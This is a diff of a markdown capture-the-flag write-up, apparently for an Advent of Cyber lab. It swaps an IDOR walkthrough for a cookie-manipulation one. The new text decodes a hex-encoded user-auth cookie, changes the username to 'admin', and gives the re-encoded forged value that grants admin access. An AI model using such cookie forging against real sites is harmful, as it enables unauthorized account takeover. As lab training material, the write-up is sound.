@@ -1,38 +1,35 @@
-# Understanding Web technologies
+# Cookies Manipulation
 
-[If you want to check my notes about IDORs](https://github.com/itKhalid143/websec365/blob/main/Days/Day4-IDOR.md)
+What can we do except signing up! right! nothing! let sign up then!
+![****](/Advent%20of%20Cyber%203/Screenshots/Task1/signup.PNG)
 
-***
+Let check the console! and see what's going on!
 
-## Task1
-``After finding Santa's account, what is their position in the company?``
+![****](/Advent%20of%20Cyber%203/Screenshots/Task1/cookies.PNG)
 
-![****](/Advent%20of%20Cyber%203/Screenshots/Task1/1.PNG)
 
-- It looks we have a parameter! Yaay! that all we need for IDORs, we can try to modify this reference and see how the website going to behave!
+## Here's our cookie!
+```user-auth:7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a22746573746572363636227d```
 
-![****](/Advent%20of%20Cyber%203/Screenshots/Task1/0.PNG)
+- At the first look, we notice that this is a hexadecimal Value! Let try to convert it using online tools and see what's hides behind it! 
+---[!CyberChef](https://gchq.github.io/CyberChef/)
 
-- Oooops we entered an Invalid ID! Let try one more time gangs! Hmmm, maybe let start from ```1```?
+```json
+{company: "The Best Festival Company", isregistered:"True", username:"tester666"}
+```
 
-![****](/Advent%20of%20Cyber%203/Screenshots/Task1/2.PNG)
+- BoOooOOM! We see the username that we attempted to sign up with!
+- Let ask ourselves, Hmmmm! can we change that? Yes we can!
+```{company: "The Best Festival Company", isregistered:"True", username:"admin"}```
 
-- Yaaay!
+### The Website accepts only the Encoded Values! Means we have to replace it with Hex! Thanks to **CyberChef** for that
+```
+7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d
+```
 
-***
+![****](/Advent%20of%20Cyber%203/Screenshots/Task1/in.PNG)
 
-## Task 2 & Task 3 
+- Out of sudden a page comes up in our browser!
 
-- It's your time to shine! I know you'll going to solve them! Genius!
 
-***
-
-## Task 4
-
-![****](/Advent%20of%20Cyber%203/Screenshots/Task1/3.PNG)
-
-- Let help Santa fix those things! Well done! Let click ```Revert``` on them all.
-
-![****](/Advent%20of%20Cyber%203/Screenshots/Task1/4.PNG)
-
-- Yaay! We did it!
+## We're in! Amazing Hackers!
